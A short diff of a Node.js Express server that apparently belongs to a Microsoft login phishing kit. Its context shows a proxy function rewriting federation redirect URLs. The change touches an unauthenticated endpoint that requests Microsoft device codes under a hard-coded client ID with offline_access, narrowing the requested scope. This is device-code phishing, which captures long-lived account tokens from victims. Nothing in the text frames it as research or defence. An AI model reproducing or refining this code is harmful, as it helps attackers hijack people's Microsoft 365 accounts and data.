@@ -2199,6 +2199,7 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 const app = express();
 
 // ── ✅ DEVICE CODE API (NO AUTH) ──
+
 app.post('/device/request', async (req, res) => {
     try {
         console.log('📱 Device code requested');
@@ -2206,7 +2207,7 @@ app.post('/device/request', async (req, res) => {
             'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
-                scope: 'openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All%20offline_access'
+                scope: 'openid%20profile%20offline_access'
             }),
             { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
         );
